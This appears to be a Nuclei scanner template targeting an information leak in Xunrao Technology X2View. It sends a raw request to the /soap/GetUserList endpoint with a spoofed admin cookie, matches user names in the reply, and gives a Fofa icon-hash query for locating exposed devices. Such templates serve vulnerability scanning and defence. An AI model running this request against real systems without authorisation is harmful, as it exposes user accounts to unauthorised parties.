id: Xunrao_X2View_information_leak

info:
  name: Xunrao_X2View_information_leak
  author: HK
  severity: high
  description: Xunrao Technology X2View information leak
  metadata:
    max-request: 1
    Fofa-query: icon_hash="-1384370370"
    verified: true

http:
- raw:
  - |+
    @timeout: 30s
    GET /soap/GetUserList HTTP/1.1
    Host: {{Hostname}}
    Accept-Encoding: gzip, deflate
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
    Cookie: language=zh-cn; username=admin;
    Pragma: no-cache
    Cache-Control: no-cache
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Language: zh-CN,zh;q=0.9

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
        - <USERNAME>